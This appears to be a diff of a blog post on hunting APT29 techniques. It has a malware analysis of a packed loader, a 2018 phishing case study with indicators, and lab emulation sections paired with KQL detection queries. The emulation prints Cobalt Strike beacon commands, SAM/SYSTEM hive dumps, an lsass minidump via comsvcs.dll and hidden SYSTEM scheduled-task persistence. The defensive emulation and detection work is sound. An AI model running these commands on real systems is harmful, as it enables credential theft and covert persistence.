+<img src="/assets/img/posts/apt29-hunting/img-063.png" width="420" alt="crafted phishing sample"/>
 
-Identify spoofing
+#### Full Malware Analysis — `covenant.exe`
 
-Validate domain → DKIM/SPF failures
+> 📎 Reference walkthrough: <https://mssplab.github.io/threat-hunting/2023/06/02/malware-analysis-apt29.html>
 
-Extract ISO base64
+| Field | Value |
+|-------|-------|
+| **File name** | `covenant.exe` |
+| **File hash (SHA-256)** | `287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc` |
+| **File size** | 201 KB |
+| **VT detection** | 40 / 71 vendors flagged malicious |
+| **Sample** | <https://tria.ge/230613-s1dz9shc81> |
 
-Decode it manually
+<img src="/assets/img/posts/apt29-hunting/img-064.png" width="460" alt="VT detection"/>
 
-Mount the ISO in your external VM
+**PEStudio analysis:**
 
-Analyze.lnk metadata
-
-### Full Malware Analysis For Sample
-
-> **Ref:** <https://mssplab.github.io/threat-hunting/2023/06/02/malware-analysis-apt29.html>
-
-File Name: covenant.exe
-
-File Hash:
-287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc
-
-File Size: 201KB
-
-40/71 security vendors flagged this file as malicious
-
-![](/assets/img/posts/apt29-hunting/img-064.png)
-
-Sample URL: https://tria.ge/230613-s1dz9shc81
-
-![](/assets/img/posts/apt29-hunting/img-065.png)
-
-Now lets use pestudio to go further in this sample:
-
-![](/assets/img/posts/apt29-hunting/img-066.png)
-
-**File Header:**
-
-```
- 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00
-00 00 00 40 00 00 00 00 00 00 00
+```text
+File Header: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 ...
+Type:        executable, 64-bit, GUI
+Entry Point: 48 83 EC 28 E8 D7 03 00 00 48 83 C4 28 E9 7A FE FF FF CC CC ...
 ```
 
-Type: executable, 64-bit, GUI
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-065.png" width="400" alt="PEStudio header"/></td><td><img src="/assets/img/posts/apt29-hunting/img-066.png" width="400" alt="PEStudio"/></td></tr>
+</table>
 
-**Entry Point:**
+**Imports** *(this is a packed file — imports are not very telling):*
+`CreateTimerQueueTimer` · `TerminateProcess` · `GetCurrentProcess` · `WaitForSingleObject` · `CreateThread` · `GetEnvironmentStringsW` · `FindNextFileW`
 
+**Strings** *(mostly junk / encrypted blob):* `GetCommandLine` · `xuzviqpds{cxdfklk` · `MS Shell Dlg` · `UpdateWindow` · `LoadIcon`
+
+<img src="/assets/img/posts/apt29-hunting/img-067.png" width="400" alt="imports"/>
+
+##### Why it looks "clean" by strings and imports
+
+This is a **low-level loader/injector** — typical of APT29 / Cozy Bear. It is **not** a Word macro, a PowerShell script, a Cobalt Strike beacon, or a Covenant grunt.
+
+- **Minimal imports / API hashing.** Instead of importing `VirtualAlloc`, `CreateRemoteThread`, `WriteProcessMemory`, `VirtualProtect`, `CreateProcess`, etc., the loader hashes each API name at runtime, resolves it dynamically, and calls it by pointer. Effects:
+  1. Static scanners see no suspicious APIs.
+  2. Analysts see a harmless-looking import table.
+  *(This technique is heavily documented in NSA's public reports on APT29.)*
+- **Random strings = encrypted payload.** Strings like `D$E3 LSHH3 htJ |SHH T50H 5Eu` are fragments of an encrypted blob (XOR loops, ADD/SUB transforms, rolling ciphers). The decrypted payload exists **only in memory** after the loader runs — which is why you never see URLs, domains, PowerShell commands, config, or keys statically.
+
+<img src="/assets/img/posts/apt29-hunting/img-068.png" width="400" alt="loader behavior"/> <img src="/assets/img/posts/apt29-hunting/img-069.png" width="400" alt="loader behavior"/>
+
+##### Core behavior of the loader
+
+1. **Calls `CreateTimerQueueTimer`** — not normal scheduling; used for delayed execution, anti-debugging, and anti-sandbox (sandboxes kill samples that "sleep too long").
+2. **Decrypts the embedded payload** from `.rdata`, `.data`, custom sections, or PE resources.
+3. **Resolves APIs dynamically** at runtime: `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`, `CreateThread`.
+4. **Performs injection** — self-injection (stealthy) or into a newly spawned hollowed process.
+5. **Executes the Stage-1 payload** — backdoor, C2 communication, persistence, lateral movement.
+
+### 2.6 Emulation: Delivery via Cobalt Strike
+
+Create a payload in Cobalt Strike connected to a pre-existing listener.
+
+<img src="/assets/img/posts/apt29-hunting/img-070.png" width="460" alt="Cobalt Strike listener"/>
+
+<img src="/assets/img/posts/apt29-hunting/img-071.png" width="460" alt="Cobalt Strike payload"/>
+
+It will be detected by mail security, which can be bypassed by standing up your own mail server (e.g. Mailhog) — out of scope here.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-073.png" width="380" alt="crafted phishing email"/></td><td><img src="/assets/img/posts/apt29-hunting/img-075.png" width="250" alt="delivery"/></td></tr>
+</table>
+
+After delivery and clicking the link, the victim connects directly into the **C2 tunnel**.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-076.png" width="400" alt="C2 tunnel up"/></td><td><img src="/assets/img/posts/apt29-hunting/img-079.png" width="260" alt="session"/></td></tr>
+</table>
+
+Open an interactive session and rename the implant to evade further detection:
+
+```powershell
+[12/02 10:22:40] beacon> powershell Rename-Item "C:\Users\Victim-Machine\Desktop" "OneDrive.exe"
 ```
- 48 83 EC 28 E8 D7 03 00 00 48 83 C4 28 E9 7A FE FF FF CC CC
-40 53 48 83 EC 20 48 8B D9 33 C9 FF
-```
 
-**DOS Header:**
+**KQL for hunting:**
 
-```
-22AB96745BD7148270DAB3A859A3107FBFE34604E3B627D307CC6EC7847E
-```
-
-6C6F
-
-### Imports
-
-( This file is packed file, imports will not be a big deal here )
-
-CreateTimerQueueTimer
-
-TerminateProcess
-
-GetCurrentProcess
-
-WaitForSingleObject
-
-CreateThread
-
-GetEnvironmentStringsW
-
-FindNextFileW
-
-### Strings
-
-\r\n\r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n\r\n
-
-GetCommandLine xuzviqpds{cxdfklk
-
-MS Shell Dlg
-
-UpdateWindow
-
-LoadIcon
-
-![](/assets/img/posts/apt29-hunting/img-067.png)
-
-![](/assets/img/posts/apt29-hunting/img-068.png)
-
-![](/assets/img/posts/apt29-hunting/img-069.png)
-
-Why it sound clean from strings and import:
-
-This behavior is typical of APT29 / Cozy Bear loaders. It is not:
-
-a Word macro a PowerShell script a Cobalt Strike beacon or a Covenant “grunt”
-
-It is a low-level loader/injector.
-
-This is the most important concept to understand.
-
-### Minimal Imports
-
-The reason you only see common WinAPI imports (GetCommandLine, HeapAlloc, etc.) is because the attacker uses API hashing.
-
-Instead of importing functions like:
-
-VirtualAlloc
-
-CreateRemoteThread
-
-WriteProcessMemory
-
-VirtualProtect
-
-CreateProcess
-
-Etc.
-
-…the loader calculates the hash of each API name at runtime, resolves it dynamically, and then calls the function by pointer.
-
-This has two effects:
-
-1. Static scanners do not see suspicious APIs.
-
-2. Analysts looking at imports see a harmless-looking executable.
-
-This technique is heavily documented in NSA’s public reports on APT29.
-
-Strange / Random Strings
-
-The strings you saw:
-
-D$E3 LSHH3 htJ |SHH T50H 5Eu...
-
-These are not real meaningful strings.
-
-They are pieces of an encrypted payload blob, usually encrypted through:
-
-XOR loops
-
-ADD/SUB transformations rolling ciphers
-
-The decrypted payload does not exist in the file statically. It exists only in memory after the loader runs.
-
-This is why you do not see:
-
-URLs domains
-
-PowerShell commands configuration data cryptographic keys
-
-All of that is hidden inside the encrypted blob.
-
-### Core Behavior of the Loader
-
-Based on the public analysis, the loader does the following:
-
-Calls CreateTimerQueueTimer
-
-This is not normal scheduling. APT29 uses it for:
-
-delayed execution anti-debugging anti-sandbox (sandboxes often kill samples that “sleep too long”)
-
-Decrypts the embedded payload: Inside sections such as:
-
-.rdata
-
-.data custom sections or inside the PE resources
-
-The loader extracts, decrypts, and prepares the next stage.
-
-Resolves APIs dynamically
-
-After decrypting the shellcode, it resolves functions such as:
-
-LoadLibraryA
-
-GetProcAddress
-
-VirtualAlloc
-
-VirtualProtect
-
-CreateThread
-
-These appear only during runtime, not in static imports.
-
-Performs injection
-
-It typically injects into:
-
-its own process (self-injection, stealthy), or a newly spawned hollowed process
-
-This behavior is characteristic of APT29 loaders.
-
-Executes the Stage-1 Payload
-
-Once injected, the Stage-1 component begins the real work:
-
-backdoor functionality
-
-C2 communication persistence lateral movement
-
-This is where the operation truly begins.
-
-How the deploy will go?
-
-Let create a payload with cobalt strike
-
-It will be connected with a previous listener i already made
-
-![](/assets/img/posts/apt29-hunting/img-070.png)
-
-![](/assets/img/posts/apt29-hunting/img-071.png)
-
-![](/assets/img/posts/apt29-hunting/img-072.png)
-
-![](/assets/img/posts/apt29-hunting/img-073.png)
-
-it will be detected but u can bypass this by creating ur own mail server like Mailhok but i will not waste time here tbh
-
-After Delivery and clicking the link victim will be connected directly in C2 tunnel
-
-![](/assets/img/posts/apt29-hunting/img-074.png)
-
-![](/assets/img/posts/apt29-hunting/img-075.png)
-
-![](/assets/img/posts/apt29-hunting/img-076.png)
-
-![](/assets/img/posts/apt29-hunting/img-077.png)
-
-and now the tunnel is up we can open an interactive session and re-name the file to avoid any further detections "[12/02 10:22:40] beacon> powershell Rename-Item "C:\Users\Victim- Machine\Desktop" "OneDrive.exe""
-
-![](/assets/img/posts/apt29-hunting/img-078.png)
-
-![](/assets/img/posts/apt29-hunting/img-079.png)
-
-![](/assets/img/posts/apt29-hunting/img-080.png)
-
-### KQL for hunting
-
-```
+```kql
 DeviceFileEvents
 | where FolderPath endswith @"\Desktop"
-| where FileName contains "Attack" or FileName contains "Update" or FileName endswith
-".hta" or FileName endswith ".exe"
+| where FileName contains "Attack" or FileName contains "Update"
+   or FileName endswith ".hta" or FileName endswith ".exe"
 ```
-
-```
+```kql
 DeviceProcessEvents
 | where InitiatingProcessFileName in ("explorer.exe", "outlook.exe")
 | where FileName endswith ".hta" or FileName endswith ".exe"
 ```
-
-```
+```kql
 DeviceProcessEvents
 | where InitiatingProcessFileName == "mshta.exe"
-```
-
 | where FileName == "powershell.exe" or FileName == "pwsh.exe"
-
-## T1059.001 "Command and Scripting Interpreter: PowerShell
-
-Cozy Bear makes heavy use of PowerShell to run commands and retrieve malicious payloads on compromised systems. Their operators frequently obfuscate or encode PowerShell instructions to evade EDR controls and minimize detection. PowerShell is also commonly used to fetch additional payloads from remote servers or execute scripts that support lateral movement inside the network. Moreover, the group often combines PowerShell with other living-off-the-land techniques (LOLBins) to blend their activity with legitimate system processes and further reduce visibility
-
-> **Ref:** <https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques?utm_source=chatgpt.com#indicators-of-compromise-(iocs>
-
-In November 2018, FireEye detected a targeted phishing campaign affecting multiple industries including defense, law enforcement, media, pharmaceuticals, think tanks, and the U.S. public sector. The emails impersonated the U.S. Department of State and delivered malicious Windows shortcut (LNK) files inside ZIP archives. The LNK files executed Cobalt Strike Beacon, a post-exploitation framework, along with benign decoy documents.
-
-Technical analysis and historical similarities suggest the campaign is likely linked to APT29, a Russian-state-affiliated threat group known for sophisticated espionage. APT29 is known to quickly abandon phishing implants after initial compromise.
-
-### Key Features of the Campaign
-
-Phishing Infrastructure
-
-Emails came from likely compromised legitimate servers (e.g., a hospital).
-
-Links pointed to ZIP files hosted on compromised domains like jmj[.]com.
-
-Emails appeared as official Department of State communications, using publicly available forms (ds7002.pdf) as decoys.
-
-Malware Delivery
-
-ZIP archives contained:
-
-Malicious LNK file: ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c)
-
-Decoy document: ds7002.pdf (benign)
-
-The LNK executed an obfuscated PowerShell command that:
-
-Extracted embedded content from the LNK.
-
-Base64-decoded it.
-
-Ran the Cobalt Strike Beacon DLL ( cyzfc.dat ).
-
-The DLL was executed using rundll32.exe via the export function
-
-PointFunctionCall.
-
-Command and Control (C2)
-
-The Beacon payload communicated with pandorasong[.]com over HTTPS (port 443), using a modified Pandora Malleable C2 profile to evade detection.
-
-Configured for process injection into rundll32.exe and included custom HTTP headers and user-agent strings to mimic legitimate traffic.
-
-### Operational Timeline
-
-Infrastructure registration and setup began ~30 days before the campaign.
-
-Key dates:
-
-Oct 15, 2018: C2 domain registered and SSL certificate issued.
-
-Nov 2, 2018: LNK weaponized.
-
-Nov 14, 2018: First phishing emails sent.
-
-### Similarities to 2016 Campaign
-
-LNK structure and metadata, including MAC address of the system used to build the file.
-
-PowerShell loader functions and obfuscation methods.
-
-Targeting patterns and specific recipients.
-
-Main difference: 2018 campaign used Cobalt Strike rather than custom malware.
-
-### Indicators of Compromise (IoCs)
-
-Phishing Email: DOSOneDriveNotifications-svCT-Mailbox…
-
-@northshorehealthgm[.]org
-
-Malware Hosting: https://www.jmj[.]com/personal/nauerthn_state_gov/*
-
-C2 Domain: pandorasong[.]com → 95.216.59[.]92
-
-Malicious Files:
-
-ds7002.zip (MD5: 3fccf531ff0ae6fedd7c586774b17a2d)
-
-ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c)
-
-cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b)
-
-Decoy File: ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd)
-
-### FireEye Detection
-
-The campaign was detected across FireEye products, flagged as:
-
-Malware.Archive
-
-Malware.Binary.lnk
-
-Suspicious.Backdoor.Beacon
-
-SUSPICIOUS POWERSHELL USAGE
-
-Structured Threat Reputation hits for IPs, domains, and file hashes.
-
-### Implications
-
-The activity shows APT29-level sophistication, particularly in infrastructure preparation, obfuscation, and phishing tactics.
-
-Network defenders should focus on full compromise scope investigation, regardless of confirmed APT29 attribution.
-
-Organizations previously targeted by APT29 should be particularly vigilant for similar phishing and post-exploitation activity.
-
-> **Ref:** <https://cloud.google.com/blog/topics/threat-intelligence/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign?utm_source=chatgpt.com>
-
-### Technical Side
-
-We will skip mail delivery section, it already done b4, now we want to do the following
-
-Create DLL Beacon
-
-Send it to Victim
-
-Use it to run powershell commands
-
-We will use encoded powershell command to run rundll32.exe on our beacon i already made the beacon
-
-![](/assets/img/posts/apt29-hunting/img-081.png)
-
-![](/assets/img/posts/apt29-hunting/img-082.png)
-
-Lets open this DLL and start our beacon "rundll32 C:\Users\Victim- Machine\Desktop\APT29.dll,StartW"
-
-![](/assets/img/posts/apt29-hunting/img-083.png)
-
-Now from beacon interact portal lets do our powershell commands:
-
-![](/assets/img/posts/apt29-hunting/img-084.png)
-
-### Enumeration List Found
-
-powershell Get-WmiObject Win32_ComputerSystem powershell Get-WmiObject Win32_OperatingSystem powershell [Environment]::OSVersion powershell systeminfo powershell whoami /all powershell Get-LocalUser powershell net user powershell net localgroup administrators powershell Get-NetIPAddress powershell Get-NetRoute powershell Get-NetTCPConnection powershell arp -a powershell reg save HKLM\SAM C:\Users\Public\SAM powershell reg save HKLM\SYSTEM C:\Users\Public\SYSTEM powershell rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
-
-![](/assets/img/posts/apt29-hunting/img-085.png)
-
-![](/assets/img/posts/apt29-hunting/img-086.png)
-
-![](/assets/img/posts/apt29-hunting/img-087.png)
-
-**KQL for Hunting:**
-
 ```
+
+---
+
+## 3 · T1059.001 — PowerShell
+
+APT29 makes heavy use of PowerShell to run commands and retrieve payloads on compromised systems. Operators frequently obfuscate or encode instructions to evade EDR, fetch additional payloads from remote servers, and support lateral movement — often combined with **LOLBins** to blend in with legitimate processes.
+
+> 📎 Reference: <https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques>
+
+#### Case Study — November 2018 FireEye-Detected Campaign
+
+In **November 2018**, FireEye detected a phishing campaign across defense, law enforcement, media, pharmaceuticals, think tanks, and the U.S. public sector. Emails impersonated the **U.S. Department of State** and delivered malicious **LNK** files inside ZIP archives. The LNKs executed **Cobalt Strike Beacon** alongside benign decoys. The campaign is assessed as likely **APT29**.
+
+**Phishing infrastructure**
+- Emails from likely-compromised legitimate servers (e.g., a hospital).
+- Links to ZIP files on compromised domains like `jmj[.]com`.
+- Emails appeared as official State Department communications, using public forms (`ds7002.pdf`) as decoys.
+
+**Malware delivery** — ZIP archives contained:
+- Malicious LNK: `ds7002.lnk` (MD5 `6ed0020b0851fb71d5b0076f4ee95f3c`)
+- Decoy: `ds7002.pdf` (benign)
+
+The LNK ran an obfuscated PowerShell command that extracted embedded content from the LNK, Base64-decoded it, and ran the Cobalt Strike Beacon DLL `cyzfc.dat` via `rundll32.exe` (export `PointFunctionCall`).
+
+**Command & Control**
+- Beacon communicated with `pandorasong[.]com` over HTTPS/443 using a modified **Pandora** Malleable C2 profile.
+- Configured for process injection into `rundll32.exe`, with custom HTTP headers and User-Agent strings to mimic legitimate traffic.
+
+**Operational timeline**
+
+| Date | Event |
+|------|-------|
+| Oct 15, 2018 | C2 domain registered, SSL certificate issued |
+| Nov 2, 2018 | LNK weaponized |
+| Nov 14, 2018 | First phishing emails sent |
+
+**Similarities to the 2016 campaign:** LNK structure & metadata (including builder MAC address), PowerShell loader functions/obfuscation, and targeting patterns. Main difference: 2018 used **Cobalt Strike** rather than custom malware.
+
+**Indicators of Compromise**
+
+| Type | Indicator |
+|------|-----------|
+| Phishing email | `DOSOneDriveNotifications-...@northshorehealthgm[.]org` |
+| Malware hosting | `https://www.jmj[.]com/personal/nauerthn_state_gov/*` |
+| C2 domain | `pandorasong[.]com` → `95.216.59[.]92` |
+| `ds7002.zip` | MD5 `3fccf531ff0ae6fedd7c586774b17a2d` |
+| `ds7002.lnk` | MD5 `6ed0020b0851fb71d5b0076f4ee95f3c` |
+| `cyzfc.dat` | MD5 `16bbc967a8b6a365871a05c74a4f345b` |
+| `ds7002.pdf` (decoy) | MD5 `313f4808aa2a2073005d219bc68971cd` |
+
+FireEye detections: `Malware.Archive`, `Malware.Binary.lnk`, `Suspicious.Backdoor.Beacon`, `SUSPICIOUS POWERSHELL USAGE`.
+
+> 📎 Reference: <https://cloud.google.com/blog/topics/threat-intelligence/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign>
+
+#### Simulation Section
+
+Steps (mail delivery already covered): **create a DLL beacon → send to victim → run PowerShell commands**. We use an encoded PowerShell command to run `rundll32.exe` against our beacon.
+
+```text
+rundll32 C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
+```
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-082.png" width="300" alt="beacon"/></td><td><img src="/assets/img/posts/apt29-hunting/img-084.png" width="380" alt="beacon interact"/></td></tr>
+</table>
+
+**Enumeration commands run from the beacon:**
+
+```powershell
+powershell Get-WmiObject Win32_ComputerSystem
+powershell Get-WmiObject Win32_OperatingSystem
+powershell [Environment]::OSVersion
+powershell systeminfo
+powershell whoami /all
+powershell Get-LocalUser
+powershell net user
+powershell net localgroup administrators
+powershell Get-NetIPAddress
+powershell Get-NetRoute
+powershell Get-NetTCPConnection
+powershell arp -a
+powershell reg save HKLM\SAM    C:\Users\Public\SAM
+powershell reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
+powershell rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
+```
+
+<img src="/assets/img/posts/apt29-hunting/img-085.png" width="380" alt="enumeration"/> <img src="/assets/img/posts/apt29-hunting/img-086.png" width="380" alt="enumeration"/>
+
+**KQL for hunting:**
+
+```kql
 DeviceProcessEvents
-```
-
 | where FileName ==~ "powershell.exe"
-
 | where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-nop", "-noni", "-w hidden")
-
-or ProcessCommandLine matches "[A-Za-z0-9+/]{20,}={0,2}"
-
-or ProcessCommandLine contains "FromBase64String"
-
+   or ProcessCommandLine matches "[A-Za-z0-9+/]{20,}={0,2}"
+   or ProcessCommandLine contains "FromBase64String"
 | join kind=leftouter (
-
-DeviceNetworkEvents
-
-| where InitiatingProcessFileName ==~ "powershell.exe"
-
-| project DeviceId, RemoteIP, RemotePort, InitiatingProcessCommandLine
-
-) on DeviceId
-
+    DeviceNetworkEvents
+    | where InitiatingProcessFileName ==~ "powershell.exe"
+    | project DeviceId, RemoteIP, RemotePort, InitiatingProcessCommandLine
+  ) on DeviceId
 | project Timestamp, DeviceName, ProcessCommandLine, RemoteIP, RemotePort
-
-## T1053.005 "Scheduled Task/Job: Scheduled Task"
-
-Cozy Bear frequently leverages Windows Scheduled Tasks as a persistence mechanism, enabling the execution of malicious scripts or programs at specific times or intervals. By creating or altering scheduled tasks on compromised systems, they can repeatedly run their payloads without any user interaction, making detection significantly more difficult.
-
-A common approach involves creating a task with an innocuous name like "System Update", configured to launch a PowerShell script every hour for C2 communication, data exfiltration, or fetching additional instructions. For example:
-
-```
-schtasks /create /tn "SystemUpdate" /tr "powershell.exe -ExecutionPolicy
 ```
 
-Bypass -File C:\path\to\script.ps1" /sc hourly
+<img src="/assets/img/posts/apt29-hunting/img-087.png" width="380" alt="KQL hunting"/>
 
-Cozy Bear may further modify task settings to resemble legitimate system maintenance or use randomized intervals to avoid generating predictable patterns that security tools could flag. Scheduled tasks offer a flexible and reliable persistence method, as they can be easily updated, disabled, or removed remotely, allowing Cozy Bear to maintain or adjust their access without drawing attention.
+---
 
-APT29 used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement. They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the 2020 SolarWinds intrusion. They previously used named and hijacked scheduled tasks to also establish persistence.
+## 4 · T1053.005 — Scheduled Task
 
-https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing- campaigns https://cyber-kill-chain.ch/techniques/T1053/005/
+Cozy Bear leverages Windows Scheduled Tasks for persistence, running payloads at specific times/intervals without user interaction. A common pattern is an innocuously-named task (e.g. *"System Update"*) launching a PowerShell script hourly for C2, exfiltration, or fetching instructions:
 
-APT29 often enhances stealth by:
-
-Randomizing execution intervals (triggering every 47–93 minutes) to avoid detection based on predictable patterns.
-
-Using hidden or minimally privileged accounts to run scheduled tasks, reducing visibility and reducing the chance of privilege‑based alerting.
-
-Leveraging encoded or obfuscated PowerShell commands, ensuring that the malicious logic is not easily readable.
-
-Using “AtLogon” or “OnStartup” triggers, ensuring persistence even after system reboots or user sessions restart.
-
-Configuring tasks to run whether the user is logged in or not, with stored credentials if necessary.
-
-Disguising tasks to mimic vendor or operating system maintenance jobs, blending seamlessly with existing scheduled operations.
-
-Furthermore, Cozy Bear may modify or disable scheduled tasks on‑the‑fly to adjust their operational tempo. Tasks can be remotely:
-
-Modified using schtasks /change
-
-Disabled using schtasks /change /disable
-
-Deleted using schtasks /delete
-
-### Simulation Section
-
-I will use beacon which used in T1059.001 "APT29.dll"
-
-Lets try to upload ps file by this beacon
-
-I used chatgpt to create quick ps file
-
-Create file called update_log.txt
-
-Each time script run will add the timestamp
-
-![](/assets/img/posts/apt29-hunting/img-088.png)
-
-Created on /home/kali/Desktop
-
-![](/assets/img/posts/apt29-hunting/img-089.png)
-
-Lets upload from C2 instance dll file beacon> cd C:\Users\Victim-Machine\Desktop\ upload /home/kali/Desktop/APT-shtask.ps1
-
-![](/assets/img/posts/apt29-hunting/img-090.png)
-
-We will try to create schedule task by powershell commands (encoded and plain)
-
-```
-Plain command " schtasks /create /tn "SystemUpdate" /tr "powershell.exe -
+```bat
+schtasks /create /tn "SystemUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\path\to\script.ps1" /sc hourly
 ```
 
-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Victim- Machine\Desktop\APT-shtask.ps1" /sc hourly /ru SYSTEM "
+APT29 also used `scheduler` / `schtasks` to create tasks on **remote hosts** during lateral movement, modified legitimate tasks then restored them, and created a scheduled task to maintain **SUNSPOT** persistence during the 2020 **SolarWinds** intrusion.
 
-Lets deploy it as a sh-task
+**Stealth enhancements:**
+- Randomized intervals (e.g. every **47–93 minutes**) to break predictable patterns.
+- Hidden or minimally-privileged accounts.
+- Encoded/obfuscated PowerShell payloads.
+- `AtLogon` / `OnStartup` triggers for reboot persistence.
+- Tasks run whether or not the user is logged in (stored credentials).
+- Disguised to mimic vendor/OS maintenance jobs.
 
-To do it u need first SYSTEM Privilege
+Tasks can be remotely **modified** (`schtasks /change`), **disabled** (`/change /disable`), or **deleted** (`/delete`).
 
-If U Used getuid in beacon it will give "You are DESKTOP-M8AP5P7\Victim-Machine"
+> 📎 References: [Tracking APT29 phishing](https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing-campaigns) · [cyber-kill-chain.ch T1053/005](https://cyber-kill-chain.ch/techniques/T1053/005/)
 
-![](/assets/img/posts/apt29-hunting/img-091.png)
+#### Simulation Section
 
-So now our goal is to escalate our privileges
+Re-using the `APT29.dll` beacon from T1059.001, upload a PowerShell script that appends a timestamp to `update_log.txt` each run:
 
-Lets run this command to check which privileges this user in powershell whoami /groups execute whoami /groups
-
-![](/assets/img/posts/apt29-hunting/img-092.png)
-
-The user is in the Administrators group but marked as Deny Only, which means:
-
-The user is not actually an Administrator.
-
-The session is not elevated.
-
-You cannot use /ru SYSTEM.
-
-You cannot perform strong persistence techniques like APT29 until you do Privilege Escalation.
-
-And this is completely normal on Windows 10.
-
-Here we have 3 options to go with:
-
-Run schedule task with local user access powershell schtasks /create /tn "UserUpdate" /tr "powershell.exe - NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1" /sc hourly /f (will do the needed but still no high privilege)
-
-Run the beacon as Admin (we will use this to avoid wasting time as we don't talk about privilege escalation)
-
-![](/assets/img/posts/apt29-hunting/img-093.png)
-
-![](/assets/img/posts/apt29-hunting/img-094.png)
-
-![](/assets/img/posts/apt29-hunting/img-095.png)
-
-![](/assets/img/posts/apt29-hunting/img-096.png)
-
-Lets create the sh-task now: powershell schtasks /create /tn
-
-SystemUpdate /tr "powershell.exe -NoProfile -WindowStyle Hidden - ExecutionPolicy Bypass -File C:\\Users\\Victim-Machine\\Desktop\\APT- shtask.ps1" /sc hourly /ru SYSTEM /f
-
-![](/assets/img/posts/apt29-hunting/img-097.png)
-
-"SUCCESS: The scheduled task "SystemUpdate" has successfully been created."
-
-Run other Process as Admin and steal the token from it "uac-token- duplication"
-
-Failed. Tried 0 process tokens => no process have an admin token
-
-You should scan which process run with high privilege, you can use ps command in beacon
-
-![](/assets/img/posts/apt29-hunting/img-098.png)
-
-![](/assets/img/posts/apt29-hunting/img-099.png)
-
-Run in hidden style legit name
-
-Trigger each hour
-
-Run as SYSTEM User
-
-**KQL for Hunting:**
-
+```bash
+beacon> cd C:\Users\Victim-Machine\Desktop\
+beacon> upload /home/kali/Desktop/APT-shtask.ps1
 ```
+
+<img src="/assets/img/posts/apt29-hunting/img-088.png" width="420" alt="upload ps1"/>
+
+**Plain scheduled-task command:**
+```bat
+schtasks /create /tn "SystemUpdate" /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1" /sc hourly /ru SYSTEM
+```
+
+<img src="/assets/img/posts/apt29-hunting/img-092.png" width="400" alt="schtask"/>
+
+> **`/ru SYSTEM` requires SYSTEM privilege.** `getuid` returns `DESKTOP-M8AP5P7\Victim-Machine`, and `whoami /groups` shows the Administrators group marked **Deny Only** — meaning the user is **not** an effective admin and the session is **not** elevated. Strong APT29-style persistence requires privilege escalation first.
+{: .prompt-warning }
+
+<img src="/assets/img/posts/apt29-hunting/img-093.png" width="360" alt="whoami groups"/>
+
+**Three options:**
+
+1. **Local-user task** (works, but no high privilege):
+   ```bat
+   schtasks /create /tn "UserUpdate" /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1" /sc hourly /f
+   ```
+2. **Run the beacon as Admin** (used here to save time — privilege escalation is out of scope):
+   ```bat
+   schtasks /create /tn SystemUpdate /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Victim-Machine\\Desktop\\APT-shtask.ps1" /sc hourly /ru SYSTEM /f
+   ```
+   → `SUCCESS: The scheduled task "SystemUpdate" has successfully been created.`
+3. **Token theft** (`uac-token-duplication`) — *failed: no process held an admin token.* Scan for high-privilege processes with the beacon's `ps` command.
+
+The resulting task runs **hidden**, under a **legit name**, **hourly**, as **SYSTEM**.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-098.png" width="380" alt="task created"/></td><td><img src="/assets/img/posts/apt29-hunting/img-099.png" width="380" alt="task properties"/></td></tr>
+</table>
+
+**KQL for hunting:**
+
+```kql
 DeviceEvents
 | where ActionType == "ScheduledTaskCreated"
 | project Timestamp, DeviceName, AccountName, AdditionalFields
 | order by Timestamp desc
 ```
-
-```
+```kql
 DeviceEvents
-| where ActionType == "ScheduledTaskCreated"
-or ActionType == "ScheduledTaskUpdated"
+| where ActionType == "ScheduledTaskCreated" or ActionType == "ScheduledTaskUpdated"
 | where AdditionalFields contains "powershell.exe"
 | project Timestamp, DeviceName, AccountName, AdditionalFields
 ```
-
-```
+```kql
 DeviceEvents
 | where ActionType =~ "ScheduledTaskCreated"
 | where AdditionalFields contains "SystemUpdate"
-or AdditionalFields contains "Update"
-or AdditionalFields contains "Maintenance"
+   or AdditionalFields contains "Update" or AdditionalFields contains "Maintenance"
 | project Timestamp, DeviceName, AccountName, AdditionalFields
 ```
 
-## T1021.001 "Remote Services: Remote Desktop Protocol"
+---
 
